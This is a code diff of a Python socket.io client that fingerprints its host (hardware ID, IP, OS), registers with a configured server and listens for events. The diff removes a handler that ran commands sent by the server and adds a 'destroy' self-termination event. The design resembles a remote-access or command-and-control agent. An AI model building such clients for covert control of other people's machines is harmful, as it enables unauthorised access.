@@ -2,6 +2,7 @@ import socketio
 from command_handler import run_command
 from utils.system_info import get_hwid, get_ip, get_os
 from config import SERVER_URL 
+import sys
 
 sio = socketio.Client()
 
@@ -14,10 +15,16 @@ def connect():
 def disconnect():
     print('Disconnected from server')
 
-@sio.event
-def command(data):
-    print(f'Command received: {data}')
-    run_command(data)
+
+def connect_to_server():
+    print("[*] Connecting to server...")
+    sio.connect(SERVER_URL)
+    sio.wait()
+
+@sio.on('destroy')
+def destroy_connection():
+    sio.disconnect()
+    sys.exit(0)
 
 def register_client():
     client_info = {
@@ -26,8 +33,3 @@ def register_client():
         'os': get_os()
     }
     sio.emit("register", client_info)
-
-def connect_to_server():
-    print("[*] Connecting to server...")
-    sio.connect(SERVER_URL)
-    sio.wait()
